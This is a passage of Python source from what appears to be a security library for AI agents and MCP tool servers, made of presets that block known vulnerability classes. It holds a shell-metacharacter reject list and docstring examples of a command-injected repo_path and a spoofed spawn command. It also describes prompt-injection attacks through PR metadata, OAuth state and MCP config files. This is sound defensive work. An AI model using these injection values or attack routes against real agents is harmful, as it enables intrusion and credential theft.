    elif tier is ModelCapabilityTier.OFFENSIVE_CYBER_CAPABLE:
        denied = (
            Capability.PROCESS_SHELL
            | Capability.FILESYSTEM_WRITE
            | Capability.FILESYSTEM_DELETE
            | Capability.NETWORK_ARBITRARY
        )
    else:  # ZERO_DAY_CAPABLE
        denied = (
            Capability.PROCESS_SHELL
            | Capability.PROCESS_EXEC
            | Capability.FILESYSTEM_WRITE
            | Capability.FILESYSTEM_DELETE
            | Capability.NETWORK_ALL
        )

    return CapabilityPolicy(
        granted=Capability.NONE,
        denied=denied,
        require_sandbox_for=Capability.DANGEROUS,
        model_tier=tier,
    )


# -----------------------------------------------------------------------------
# CVE-2026-5023 — codebase-mcp RepoMix OS command injection (v0.5.5+)
# -----------------------------------------------------------------------------

_CODEBASE_MCP_TOOL_NAMES = re.compile(r"^(?:get|save)(?:Remote)?Codebase$")

# Shell metacharacters whose mere presence in an argument is a reject.
# A subset of the StdioGuard metachars with ``&`` added because the
# ShellJS/RepoMix call path flagged in the SentinelOne entry treated
# ampersand as a shell separator.
_CODEBASE_MCP_SHELL_METACHARS: tuple[str, ...] = (
    ";",
    "&&",
    "||",
    "&",
    "|",
    "`",
    "$(",
    "$",
    "\n",
    "\r",
    ">",
    "<",
)


class CodebaseMcpInjectionBlocked(AirlockError):
    """Raised when a codebase-mcp-style tool carries shell-inject input."""


def codebase_mcp_cve_2026_5023_defaults() -> dict[str, Any]:
    """Return the codebase-mcp regression check for CVE-2026-5023.

    The codebase-mcp package (npm ``codebase-mcp``) wraps the RepoMix
    CLI. ``getCodebase`` / ``getRemoteCodebase`` / ``saveCodebase``
    / ``saveRemoteCodebase`` shelled out with user-controlled paths,
    yielding trivial OS command injection. SentinelOne catalogued
    2026-04 (unpatched upstream as of 2026-04-24).

    Contract::

        cfg = codebase_mcp_cve_2026_5023_defaults()
        cfg["check"](tool_name, arguments, allow_subprocess=False)
        # Raises CodebaseMcpInjectionBlocked on shell metachars or
        # names matching the four-name allowlist unless
        # allow_subprocess=True is passed.

    Primary source:
      https://www.sentinelone.com/vulnerability-database/cve-2026-5023/
    """

    def check(
        tool_name: str,
        arguments: list[str] | tuple[str, ...],
        *,
        allow_subprocess: bool = False,
    ) -> None:
        if _CODEBASE_MCP_TOOL_NAMES.match(tool_name):
            if not allow_subprocess:
                raise CodebaseMcpInjectionBlocked(
                    f"tool {tool_name!r} is in the CVE-2026-5023 "
                    "codebase-mcp name allowlist and must be opted "
                    "into via allow_subprocess=True"
                )
            for idx, arg in enumerate(arguments):
                if not isinstance(arg, str):
                    continue
                for metachar in _CODEBASE_MCP_SHELL_METACHARS:
                    if metachar in arg:
                        raise CodebaseMcpInjectionBlocked(
                            f"tool {tool_name!r} argv[{idx}]={arg!r} "
                            f"contains shell metacharacter {metachar!r} "
                            "— refusing to spawn subprocess "
                            "(CVE-2026-5023 regression class)"
                        )

    return {
        "check": check,
        "tool_name_pattern": _CODEBASE_MCP_TOOL_NAMES.pattern,
        "metachars": _CODEBASE_MCP_SHELL_METACHARS,
        "source": ("https://www.sentinelone.com/vulnerability-database/cve-2026-5023/"),
    }


# -----------------------------------------------------------------------------
# CVE-2026-30615 — Windsurf zero-click MCP-config auto-load (v0.5.7+)
# -----------------------------------------------------------------------------


# -----------------------------------------------------------------------------
# Agent-commerce caps default preset (v0.5.8+, Anthropic Project Deal class)
# -----------------------------------------------------------------------------


def agent_commerce_default_caps(
    *,
    db_path: str = ":memory:",
) -> dict[str, Any]:
    """Default agent-commerce caps for Project Deal / Stripe Agentic flows.

    Sane caps: $10/counterparty/day + hard-stop $200/agent/week. Tighten
    or relax via the ``CapsConfig`` interface.

    Primary source:
      https://www.anthropic.com/features/project-deal
    """
    from .integrations.agent_commerce_caps import (
        AgentCommerceCaps,
        Cap,
        CapsConfig,
        SQLiteLedgerStore,
    )

    config = CapsConfig(
        caps=(
            Cap(amount_cents=1_000, window="day", scope="counterparty"),
            Cap(amount_cents=20_000, window="week", scope="agent"),
        )
    )
    caps = AgentCommerceCaps(config=config, store=SQLiteLedgerStore(db_path))
    return {
        "caps": caps,
        "config": config,
        "source": "https://www.anthropic.com/features/project-deal",
    }


# -----------------------------------------------------------------------------
# CVE-2026-27825 / -27826 mcp-atlassian LAN-unauth-RCE preset (v0.5.8+)
# -----------------------------------------------------------------------------


def mcp_atlassian_cve_2026_27825(*, profile: str = "prod") -> dict[str, Any]:
    """LAN-unauth-RCE guard preset for CVE-2026-27825 / -27826.

    Disclosed [2026-04-24 by The Hacker News](https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html);
    NVD entries CVE-2026-27825 (CVSS 9.1) and CVE-2026-27826 (CVSS 8.2).
    ``mcp-atlassian`` bound to ``0.0.0.0`` and ``[::]`` with no auth
    headers, exposing the control surface to any device on the same
    network. Trivial in any office network.

    The class generalises — see also
    :func:`lan_unauth_mcp_guard` for the generic check.

    Args:
        profile: ``"prod"`` (default), ``"dev"``, or ``"strict"``
            per :class:`LANUnauthRCEPolicy`.

    Primary source:
      https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html
    """
    from .mcp_spec.lan_unauth_rce_guard import (
        LANUnauthRCEGuard,
        LANUnauthRCEPolicy,
    )

    guard = LANUnauthRCEGuard(LANUnauthRCEPolicy(profile=profile))  # type: ignore[arg-type]
    return {
        "guard": guard,
        "profile": profile,
        "source": ("https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html"),
        "covers": ("CVE-2026-27825", "CVE-2026-27826"),
    }


def lan_unauth_mcp_guard(*, profile: str = "prod") -> dict[str, Any]:
    """Generic LAN-unauth-RCE guard preset (the class, not the named CVE).

    Same machinery as :func:`mcp_atlassian_cve_2026_27825` but
    intended as a default catch for any MCP server registration —
    not scoped to atlassian-style names.
    """
    cfg = mcp_atlassian_cve_2026_27825(profile=profile)
    cfg["covers"] = ("class:lan-unauth-rce",)
    return cfg


# -----------------------------------------------------------------------------
# Comment-and-Control PR-metadata presets (v0.5.8+, Aonan Guan 2026-04-25)
# -----------------------------------------------------------------------------


def _build_pr_metadata_guard(*, dry_run: bool = False) -> Any:
    from .mcp_spec.pr_metadata_guard import PRMetadataGuard

    return PRMetadataGuard(
        rewrite_threshold=0.0,
        reject_threshold=0.9,
        dry_run=dry_run,
    )


def claude_code_security_review_cnc_2026_04(*, dry_run: bool = False) -> dict[str, Any]:
    """Comment-and-Control preset for Claude Code Security Review.

    Wires :class:`PRMetadataGuard` with conservative thresholds — every
    PR-metadata field gets sentinel-wrapped before reaching the model
    context, and any field with risk ≥ 0.9 raises
    :class:`PRMetadataInjectionRejected`.

    Set ``dry_run=True`` for the first deployment week to log without
    rewriting; flip to ``False`` once your own audit logs show no
    legitimate-PR false positives.

    Primary source:
      https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/
    """
    return {
        "guard": _build_pr_metadata_guard(dry_run=dry_run),
        "ci_runner": "claude-code-security-review",
        "fields_in_scope": (
            "pr_title",
            "pr_body",
            "commit_message",
            "issue_title",
            "issue_body",
            "review_comment",
        ),
        "source": (
            "https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/"
        ),
    }


def gemini_cli_action_cnc_2026_04(*, dry_run: bool = False) -> dict[str, Any]:
    """Comment-and-Control preset for the Gemini CLI Action.

    Same threat model as the Claude Code preset but tagged for the
    Gemini CLI runner so audit logs distinguish them.

    Primary source:
      https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/
    """
    cfg = claude_code_security_review_cnc_2026_04(dry_run=dry_run)
    cfg["ci_runner"] = "gemini-cli-action"
    return cfg


@dataclass(frozen=True)
class PresetMeta:
    """Metadata about a registered preset, returned by ``list_active``."""

    preset_id: str
    factory_name: str
    """Top-level callable in :mod:`agent_airlock.policy_presets`."""
    docstring_summary: str = ""


def list_active() -> list[PresetMeta]:
    """Return metadata for every preset factory in this module.

    Single source of truth consumed by ``airlock graph``, the OWASP
    coverage matrix, and any future tool that needs to enumerate
    presets without re-walking the package.
    """
    import inspect
    import sys

    module = sys.modules[__name__]
    out: list[PresetMeta] = []
    for name, obj in inspect.getmembers(module, inspect.isfunction):
        # Heuristics to filter out helpers + check predicates:
        # only top-level zero-arg-or-kwargs-only callables that return
        # dicts / SecurityPolicy / CapabilityPolicy / dataclasses.
        if name.startswith("_"):
            continue
        if name in {"is_destructive_tool", "list_active", "list_presets"}:
            continue
        if not name.endswith(("_policy", "_defaults", "_caps", "_2026_04")):
            continue
        try:
            sig = inspect.signature(obj)
        except (TypeError, ValueError):
            continue
        if any(
            p.kind == inspect.Parameter.POSITIONAL_OR_KEYWORD
            and p.default is inspect.Parameter.empty
            for p in sig.parameters.values()
        ):
            # Skip predicates that demand mandatory positional args
            # (e.g. ``mcpwn_cve_2026_33032_check``).
            continue
        doc = (inspect.getdoc(obj) or "").splitlines()[0] if inspect.getdoc(obj) else ""
        out.append(
            PresetMeta(
                preset_id=name,
                factory_name=name,
                docstring_summary=doc,
            )
        )
    out.sort(key=lambda m: m.preset_id)
    return out


def copilot_agent_cnc_2026_04(*, dry_run: bool = False) -> dict[str, Any]:
    """Comment-and-Control preset for GitHub Copilot Agent.

    Same threat model as the Claude Code preset but tagged for the
    Copilot Agent runner so audit logs distinguish them.

    Primary source:
      https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/
    """
    cfg = claude_code_security_review_cnc_2026_04(dry_run=dry_run)
    cfg["ci_runner"] = "copilot-agent"
    return cfg


def agent_capability_default_caps() -> dict[str, Any]:
    """Conservative capability caps for agent-on-agent surfaces.

    Mirrors the ``agent_commerce_default_caps`` preset shipped 2026-04-27
    (dollar caps) for the capability layer added 2026-04-28. Defaults:

    * ``SIGN_CONTRACT``: 0/agent without explicit grant (deny-by-default).
    * ``DELEGATE_TO_AGENT``: 3/agent/hour.
    * ``INVOKE_TOOL``: 100/agent/minute.
    * ``WRITE_FILE``: 50/agent/hour.
    * ``NETWORK_EGRESS``: 10_000_000 (10 MB) /agent/minute (counted in bytes).

    Primary source:
      https://www.anthropic.com/features/project-deal
    """
    from .capability_caps import Capability, CapabilityRule, CapabilityRulesConfig

    return {
        "preset_id": "agent_capability_default_caps",
        "advisory_url": "https://www.anthropic.com/features/project-deal",
        "rules_config": CapabilityRulesConfig(
            rules=(
                # SIGN_CONTRACT is deny-by-default; no rule = no grants.
                CapabilityRule(
                    capability=Capability.DELEGATE_TO_AGENT,
                    amount=3,
                    window="hour",
                ),
                CapabilityRule(
                    capability=Capability.INVOKE_TOOL,
                    amount=100,
                    window="minute",
                ),
                CapabilityRule(
                    capability=Capability.WRITE_FILE,
                    amount=50,
                    window="hour",
                ),
                CapabilityRule(
                    capability=Capability.NETWORK_EGRESS,
                    amount=10_000_000,
                    window="minute",
                ),
            )
        ),
    }


def gpt_5_5_spud_agent_defaults(
    *,
    max_parallel_tool_calls: int = 8,
    per_call_egress_cap_kb: int = 512,
    context_window_budget_tokens: int = 900_000,
    requires_baseline: bool = True,
) -> dict[str, Any]:
    """Conservative defaults for the OpenAI GPT-5.5 ("Spud") agent surface.

    GPT-5.5 GA'd 2026-04-23 with a 1M-token default context window and a
    homogenised tool-call shape. Without a preset, airlock-protected
    agents fall back to the model's own (zero) policy. These defaults
    bind:

    * ``max_parallel_tool_calls=8`` — refuse fan-out beyond 8 parallel
      calls in a single turn.
    * ``per_call_egress_cap_kb=512`` — cap per-tool-call outbound
      payload size; trips the existing egress budget.
    * ``context_window_budget_tokens=900_000`` — 10% headroom under the
      published 1M context window so a runaway agent cannot
      consume the entire window.
    * ``requires_baseline=True`` — every protected agent must produce a
      behavioural baseline (see ``airlock baseline init``) before
      being granted production capability grants.

    Primary source:
      https://openai.com/index/gpt-5-5/
    """
    return {
        "preset_id": "gpt_5_5_spud_agent_defaults",
        "model_id": "openai.gpt-5.5-spud",
        "schema_pinned_at": "2026-04-23",
        "max_parallel_tool_calls": max_parallel_tool_calls,
        "per_call_egress_cap_kb": per_call_egress_cap_kb,
        "context_window_budget_tokens": context_window_budget_tokens,
        "requires_baseline": requires_baseline,
        "advisory_url": "https://openai.com/index/gpt-5-5/",
    }


def oauth_state_injection_guard(
    *,
    max_state_bytes: int = 2048,
    entropy_skip_threshold: float = 3.0,
) -> dict[str, Any]:
    """Defence against OAuth ``state`` prompt-injection (BlackHat Asia 2026).

    Injects prompt strings into the OAuth ``state`` parameter and the
    callback handler decodes + relays them into a system message. This
    preset wires :class:`OAuthStateEntropyGuard` with the recommended
    defaults; high-entropy nonces and JWT tri-segments are ignored.

    Primary source:
      https://www.blackhat.com/asia-26/briefings/schedule/#oauth-state-injection
    """
    return {
        "preset_id": "oauth_state_injection_guard",
        "severity": "high",
        "default_action": "block",
        "advisory_url": (
            "https://www.blackhat.com/asia-26/briefings/schedule/#oauth-state-injection"
        ),
        "max_state_bytes": max_state_bytes,
        "entropy_skip_threshold": entropy_skip_threshold,
    }


def gemini_3_agent_defaults(
    *,
    redact_thought_signature: bool = True,
    fan_out_cap: int = 8,
    per_call_egress_cap_kb: int = 64,
) -> dict[str, Any]:
    """Conservative defaults for Google Gemini 3 Agent Mode.

    Gemini 3 GA'd 2026-04-25 with a ``function_response`` carrier and
    chain-of-thought ``thought_signature`` metadata. This preset wires
    ``redact_thought_signature=True`` (the audit-log default), a
    fan-out cap of 8 parallel calls, and a 64 KB per-call egress cap.

    Primary source:
      https://blog.google/technology/google-deepmind/gemini-3-agent-mode-ga/
    """
    return {
        "preset_id": "gemini_3_agent_defaults",
        "model_id": "gemini-3-agent",
        "schema_pinned_at": "2026-04-25",
        "redact_thought_signature": redact_thought_signature,
        "fan_out_cap": fan_out_cap,
        "per_call_egress_cap_kb": per_call_egress_cap_kb,
        "advisory_url": ("https://blog.google/technology/google-deepmind/gemini-3-agent-mode-ga/"),
    }


def mcp_config_path_traversal_cve_2026_31402(
    *,
    platform: str = "auto",
    allow_symlinks: bool = False,
) -> dict[str, Any]:
    """Path-traversal guard for MCP server-registration configs.

    CVE-2026-31402 (CVSS 8.8, NVD 2026-04-27) is a path-traversal in
    Claude Desktop's config loader that lets a hostile config write
    outside the sandboxed MCP install dir on first launch. This preset
    wires :class:`ConfigPathGuard` with the recommended defaults.

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-31402
    """
    return {
        "preset_id": "mcp_config_path_traversal_cve_2026_31402",
        "severity": "critical",
        "default_action": "block",
        "advisory_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31402",
        "platform": platform,
        "allow_symlinks": allow_symlinks,
    }


def mcp_elicitation_guard_2026_04(
    *,
    allowlist_origins: frozenset[str] = frozenset(),
    strict: bool = False,
) -> dict[str, Any]:
    """Defence for MCP ``tool/elicitation`` (spec PR #1487, 2026-04-28).

    Server-initiated elicitation round-trips can render hostile prompts
    that look authoritative to the user. This preset wires the
    ``ElicitationGuard`` with the recommended per-class actions and an
    optional ``strict`` mode that downgrades the default
    ``relay_with_warning`` for destructive confirmations to ``block``.

    Primary source:
      https://github.com/modelcontextprotocol/specification/pull/1487
    """
    from .mcp_spec.elicitation_guard import ElicitationClass

    actions: dict[ElicitationClass, str] = {
        ElicitationClass.BENIGN: "relay_with_origin_badge",
        ElicitationClass.CREDENTIAL_REQUEST: "block",
        ElicitationClass.POLICY_OVERRIDE: "block",
        ElicitationClass.DESTRUCTIVE_CONFIRMATION: ("block" if strict else "relay_with_warning"),
    }
    return {
        "preset_id": "mcp_elicitation_guard_2026_04",
        "severity": "high",
        "default_action": "block",
        "advisory_url": "https://github.com/modelcontextprotocol/specification/pull/1487",
        "actions": actions,
        "allowlist_origins": allowlist_origins,
        "strict": strict,
    }


def mcp_stdio_meta_cve_2026_04(
    *,
    enable_manifest_drift_check: bool = True,
    enable_taint_check: bool = False,
) -> dict[str, Any]:
    """Bundled defense for the OX-disclosed STDIO RCE class (v0.5.9+).

    OX Security 2026-04-26 disclosed that the Anthropic MCP STDIO
    transport class is exploitable across 200K+ servers and Anthropic
    has declined to patch ("expected behavior"). This preset wires
    every airlock STDIO-defence into a single chain:

    * argv shape enforcement (no shell-form smuggle)
    * stdio_guard (per-arg metachar / unicode / allowlist)
    * manifest drift check (signed manifest vs runtime argv) — opt-out
    * AST taint scan for remote-input → stdin sinks — opt-in (filesystem)

    The preset is the recommended default for any MCP server registered
    after 2026-04-26.

    Primary sources:
      https://www.ox.security/blog/mother-of-all-ai-supply-chains-anthropic-mcp-stdio
      https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem
      https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/
    """
    return {
        "preset_id": "mcp_stdio_meta_cve_2026_04",
        "severity": "critical",
        "default_action": "block",
        "advisory_url": (
            "https://www.ox.security/blog/mother-of-all-ai-supply-chains-anthropic-mcp-stdio"
        ),
        "stdio_config": stdio_guard_ox_defaults(),
        "enable_manifest_drift_check": enable_manifest_drift_check,
        "enable_taint_check": enable_taint_check,
        "covered_variants": (
            "argv_string_concat",
            "argv_shell_metachar",
            "argv_unicode_bidi",
            "argv_absolute_path_smuggle",
            "argv_basename_not_allowlisted",
            "argv_env_path_traversal",
            "manifest_runtime_drift",
            "stdin_remote_input_taint",
        ),
        "recommended_for": "any MCP server registered after 2026-04-26",
    }


def windsurf_cve_2026_30615_defaults(
    signer_allowlist: frozenset[str] = frozenset(),
) -> dict[str, Any]:
    """CVE-2026-30615 zero-click mcp.json auto-load preset.

    Composes :class:`ConfigFileWatchPolicy` with the Windsurf-specific
    config path and the signer-required default. The class
    generalises beyond Windsurf — VS Code, Cursor, Claude Code,
    JetBrains all auto-read project-local MCP config — but the named
    advisory triggered when ``.windsurf/mcp.json`` was rewritten by
    a prompt-injected HTML page.

    Args:
        signer_allowlist: Trusted signer identifiers. Empty means
            "any non-empty signer is acceptable" — adopt in stages.

    Contract::

        cfg = windsurf_cve_2026_30615_defaults(signer_allowlist=frozenset({"sre"}))
        cfg["audit"](path, old_sha256, new_content, old_content=...)

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-30615
    """
    from .mcp_spec.zero_click_config_guard import (
        DEFAULT_WATCHED_PATHS,
        ConfigFileWatchPolicy,
        audit_config_diff,
    )

    policy = ConfigFileWatchPolicy(
        watched_paths=DEFAULT_WATCHED_PATHS,
        require_signer_for_new_servers=True,
        quarantine_on_diff=True,
        signer_allowlist=signer_allowlist,
    )

    def audit(
        path: Any,  # pathlib.Path; kept loose to avoid an extra top-level import
        old_sha256: str | None,
        new_content: bytes,
        *,
        old_content: bytes | None = None,
    ) -> Any:
        return audit_config_diff(path, old_sha256, new_content, policy, old_content=old_content)

    return {
        "audit": audit,
        "policy": policy,
        "watched_paths": tuple(str(p) for p in policy.watched_paths),
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-30615",
    }


def mcp_config_pin(
    manifest: Iterable[Mapping[str, Any]],
    *,
    audit_path: str | None = None,
) -> dict[str, Any]:
    """CVE-2026-30615 spawn-time STDIO MCP config pin (v0.8.23+).

    The complementary, **spawn-time** half of the v0.5.7
    :func:`windsurf_cve_2026_30615_defaults` config-file watcher. Where the
    watcher diffs ``mcp.json`` bytes to catch unsigned/mutated entries on the
    *write* path, this pin fingerprints the **resolved** STDIO spawn config at
    *invocation* time and refuses anything that does not match an
    operator-supplied known-good fingerprint — fail-closed (raises, never
    warns). It catches the zero-click pattern even when the injection never
    touched a watched file (env override, in-memory resolution, a launcher).

    The fingerprint covers ``{name, command, args, env-keys}`` (env *values*
    are excluded — they rotate; the *keys* are what an injection adds). Two
    failure modes both raise :class:`McpConfigPinViolation` and emit an audit
    event on the existing structlog + JSON-Lines channels:

    - **injected** — a server name not in the pin set (``reason="unpinned"``);
    - **mutated** — a pinned server whose ``command`` / ``args`` / ``env``-keys
      changed between registration and spawn (``reason="mutated"``).

    Args:
        manifest: Known-good entries, each with ``name`` + ``command`` and
            optional ``args`` and ``env`` (dict) / ``env_keys`` (list).
        audit_path: Optional JSON-Lines audit log path. ``None`` leaves the
            JSONL channel a no-op; the structlog channel still fires.

    Returns:
        ``dict[str, Any]`` with:

        - ``pin_set`` — the :class:`McpConfigPinSet`.
        - ``check`` — ``check(server_config)`` raising
          :class:`McpConfigPinViolation` on an injected/mutated spawn config.
        - ``pinned_names`` — the pinned server names.
        - ``cves`` — ``("CVE-2026-30615",)``.
        - ``owasp`` — ``"ASI04"`` (Agentic Supply-Chain).
        - ``source`` — NVD URL.

    Contract::

        pin = mcp_config_pin([{"name": "fs", "command": "uvx",
                               "args": ["mcp-server-filesystem", "/data"]}])
        pin["check"]({"name": "fs", "command": "uvx",
                      "args": ["mcp-server-filesystem", "/data"]})   # ok
        pin["check"]({"name": "fs", "command": "/tmp/evil"})         # raises

    Primary source:
      https://nvd.nist.gov/vuln/detail/CVE-2026-30615
    """
    from .mcp_spec.zero_click_config_guard import McpConfigPinSet

    pin_set = McpConfigPinSet.from_manifest(manifest, audit_path=audit_path)

    return {
        "pin_set": pin_set,
        "check": pin_set.check,
        "pinned_names": pin_set.pinned_names,
        "cves": ("CVE-2026-30615",),
        "owasp": "ASI04",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-30615",
    }


# -----------------------------------------------------------------------------
# CVE-2026-6980 — Divyanshu-hash/GitPilot-MCP repo_path injection (v0.5.7+)
# -----------------------------------------------------------------------------

_GITPILOT_HANDLER_NAMES = re.compile(r"^(repo_path|run_git_command|exec_in_repo)$")


class GitPilotRepoPathInjection(AirlockError):
    """Raised when a GitPilot-MCP-style handler receives an unsafe repo_path."""

    def __init__(self, *, handler_name: str, repo_path: str, reason: str) -> None:
        self.handler_name = handler_name
        self.repo_path = repo_path
        self.reason = reason
        super().__init__(
            f"GitPilot-MCP handler {handler_name!r} refused repo_path "
            f"{repo_path!r}: {reason} (CVE-2026-6980)"
        )


def gitpilot_mcp_cve_2026_6980_defaults(
    safe_repo_roots: tuple[_Path_for_gitpilot, ...] = (),
) -> dict[str, Any]:
    """CVE-2026-6980 GitPilot-MCP repo_path regression preset.

    Disclosed 2026-04-25 by RedPacket Security (CVSS 7.3). The
    ``repo_path`` argument of ``Divyanshu-hash/GitPilot-MCP``'s
    ``main.py`` flowed into OS command execution. Public PoC; vendor
    unresponsive; project does not version — so the preset matches
    purely on **tool name**, not upstream package pin.

    Three handler names are caught: ``repo_path``, ``run_git_command``,
    ``exec_in_repo``. For each, the value supplied as ``repo_path``
    must:

    1. Resolve to an absolute path under one of ``safe_repo_roots``.
    2. Pass the ``shlex.quote(arg) == arg`` round-trip — i.e. contain
       no shell metacharacters.

    Args:
        safe_repo_roots: Allowed prefixes for ``repo_path``. Empty
            tuple means "any absolute path is acceptable" — but the
            shell-safe-token check still applies.

    Contract::

        cfg = gitpilot_mcp_cve_2026_6980_defaults(safe_repo_roots=(Path("/var/repos"),))
        cfg["check"]("repo_path", {"repo_path": "/var/repos/clean"})  # OK
        cfg["check"]("repo_path", {"repo_path": "/var/repos/foo`id`"})  # raises

    Primary source:
      https://www.redpacketsecurity.com/cve-alert-cve-2026-6980-divyanshu-hash-gitpilot-mcp/
    """
    roots = tuple(_Path_for_gitpilot(r).resolve() for r in safe_repo_roots)

    def check(handler_name: str, fields: dict[str, Any]) -> None:
        if not _GITPILOT_HANDLER_NAMES.match(handler_name or ""):
            return
        repo_path = fields.get("repo_path")
        if repo_path is None:
            return
        repo_path_str = str(repo_path)

        # Shell-metachar check — same shlex round-trip the
        # codebase-mcp preset uses, but applied to a single field.
        if _shlex_for_gitpilot.quote(repo_path_str) != repo_path_str:
            raise GitPilotRepoPathInjection(
                handler_name=handler_name,
                repo_path=repo_path_str,
                reason="shell-metacharacter present (shlex round-trip failed)",
            )

        path = _Path_for_gitpilot(repo_path_str)
        if not path.is_absolute():
            raise GitPilotRepoPathInjection(
                handler_name=handler_name,
                repo_path=repo_path_str,
                reason="repo_path must be absolute",
            )

        # Reject path traversal: resolved path must remain under a
        # safe root if any are configured.
        if roots:
            try:
                resolved = path.resolve()
            except (OSError, RuntimeError):
                raise GitPilotRepoPathInjection(
                    handler_name=handler_name,
                    repo_path=repo_path_str,
                    reason="resolve() failed — path is unreachable",
                ) from None
            if not any(str(resolved).startswith(str(r) + "/") or resolved == r for r in roots):
                raise GitPilotRepoPathInjection(
                    handler_name=handler_name,
                    repo_path=repo_path_str,
                    reason=f"resolved path not under {roots}",
                )

    return {
        "check": check,
        "tool_name_pattern": _GITPILOT_HANDLER_NAMES.pattern,
        "safe_repo_roots": roots,
        "source": (
            "https://www.redpacketsecurity.com/cve-alert-cve-2026-6980-divyanshu-hash-gitpilot-mcp/"
        ),
    }


# -----------------------------------------------------------------------------
# Archived MCP server advisory gate (v0.5.6+, GitHub issue #3662 class)
# -----------------------------------------------------------------------------

# Default block-list — inline so it survives wheel packaging.
#
# v0.5.6 shipped this list via a JSON file under ``tests/cves/fixtures/``,
# but ``tests/`` is not packaged in the wheel, so ``pip install``
# users got an empty block-list and the preset silently failed open.
# Fix landed in v0.5.6.1: list is hard-coded here; the JSON fixture
# stays in ``tests/`` for parser / schema tests only.
#
# Source per row: GitHub modelcontextprotocol/servers issue #3662 +
# the per-package archive notice. Kept short — three packages — to
# keep the wheel small. Callers wanting a larger block-list pass it
# via the ``block_list`` argument.
_ARCHIVED_MCP_DEFAULT_BLOCKLIST: tuple[dict[str, Any], ...] = (
    {
        "package": "@modelcontextprotocol/server-puppeteer",
        "registry": "npm",
        "archived_at": "2026-04",
        "monthly_downloads": 91000,
        "disclosed_classes": (
            "ssrf",
            "indirect_prompt_injection",
            "chromium_sandbox_bypass",
        ),
        "advisory_url": "https://github.com/modelcontextprotocol/servers/issues/3662",
    },
    {
        "package": "@modelcontextprotocol/server-brave-search",
        "registry": "npm",
        "archived_at": "2026-03",
        "monthly_downloads": 38000,
        "disclosed_classes": (
            "credential_passthrough",
            "indirect_prompt_injection",
        ),
        "advisory_url": "https://github.com/modelcontextprotocol/servers/issues/3201",
    },
    {
        "package": "@modelcontextprotocol/server-everart",
        "registry": "npm",
        "archived_at": "2026-02",
        "monthly_downloads": 12000,
        "disclosed_classes": ("ssrf",),
        "advisory_url": "https://github.com/modelcontextprotocol/servers/issues/2812",
    },
)


class ArchivedMcpServerBlocked(AirlockError):
    """Raised when a tool's package_origin is on the archived block-list."""


def archived_mcp_server_advisory_defaults(
    block_list: Iterable[dict[str, Any]] | None = None,
    allow_list: Iterable[str] = (),
) -> dict[str, Any]:
    """Fail-closed gate for tool manifests pointing at archived MCP packages.

    Motivation: GitHub issue #3662 (2026-04) documented that the
    archived ``@modelcontextprotocol/server-puppeteer`` package was
    still being installed ~91k times/month, with advisory text
    covering SSRF, indirect prompt injection, and Chromium sandbox
    bypass — none of which would ever be patched (repo archived).

    Args:
        block_list: Iterable of package metadata dicts, each at minimum
            with a ``"package"`` key. If ``None``, the default
            shipped fixture is loaded.
        allow_list: Package names that bypass the block check. Use
            sparingly; intended for in-house forks of an archived
            package where the archive text doesn't apply.

    Returns:
        A mapping with ``check(tool_manifest_dict)`` callable, the
        compiled block-set, and the primary advisory URL.

    Usage::

        cfg = archived_mcp_server_advisory_defaults()
        cfg["check"]({"package_origin": "@modelcontextprotocol/server-puppeteer"})
        # Raises ArchivedMcpServerBlocked.

    Primary source:
      https://github.com/modelcontextprotocol/servers/issues/3662
    """
    if block_list is None:
        block_list = _ARCHIVED_MCP_DEFAULT_BLOCKLIST

    block_map: dict[str, dict[str, Any]] = {}
    for entry in block_list or []:
        if isinstance(entry, dict) and "package" in entry:
            block_map[str(entry["package"])] = entry

    allow_set = frozenset(allow_list)

    def check(tool_manifest: dict[str, Any]) -> None:
        origin = tool_manifest.get("package_origin")
        if not origin:
            return
        if origin in allow_set:
            return
        if origin in block_map:
            details = block_map[origin]
            raise ArchivedMcpServerBlocked(
                f"tool manifest references archived MCP package "
                f"{origin!r} (archived {details.get('archived_at', '?')}, "
                f"~{details.get('monthly_downloads', '?')} downloads/month, "
                f"advisory: {details.get('advisory_url', '?')})"
            )

    return {
        "check": check,
        "block_list": tuple(block_map.keys()),
        "allow_list": allow_set,
        "source": "https://github.com/modelcontextprotocol/servers/issues/3662",
    }


# -----------------------------------------------------------------------------
# Claude Managed Agents safe defaults (v0.5.6+, 2026-04-08 launch)
# -----------------------------------------------------------------------------


def claude_managed_agents_safe_defaults() -> dict[str, Any]:
    """Conservative defaults for the Claude Managed Agents harness.

    Anthropic launched Managed Agents to public beta on 2026-04-08
    (used by Notion, Rakuten, Asana, Vibecode, Sentry; $0.08/runtime-
    hour). The runtime ships a curated tool surface — ``read_file``,
    ``bash``, ``web_browse``, ``code_execute`` — and streams raw tool
    inputs/outputs over Server-Sent Events.

    This preset returns a :class:`ManagedAgentsAuditConfig` with:

    - ``allowed_tools`` = empty (no managed-agent tool calls until
      caller explicitly opts in by listing tools).
    - ``require_beta_header`` = True
    - ``toolset_version`` = pinned at :data:`AGENT_TOOLSET_VERSION`
    - ``redact_sse_payloads`` = True

    The mapping returned also includes the harness tool list so
    callers can build their own intersection::

        cfg = claude_managed_agents_safe_defaults()
        audit = cfg["audit_config"]
        # Opt in to read-only operations
        audit.allowed_tools = ("read_file", "web_browse")

    Primary sources:
      https://claude.com/blog/claude-managed-agents
      https://platform.claude.com/docs/en/managed-agents/overview
    """
    from .integrations.claude_managed_agents import (
        AGENT_TOOLSET_VERSION,
        DEFAULT_HARNESS_TOOLS,
        MANAGED_AGENTS_BETA_HEADER,
        ManagedAgentsAuditConfig,
    )

    return {
        "audit_config": ManagedAgentsAuditConfig(
            allowed_tools=(),
            require_beta_header=True,
            toolset_version=AGENT_TOOLSET_VERSION,
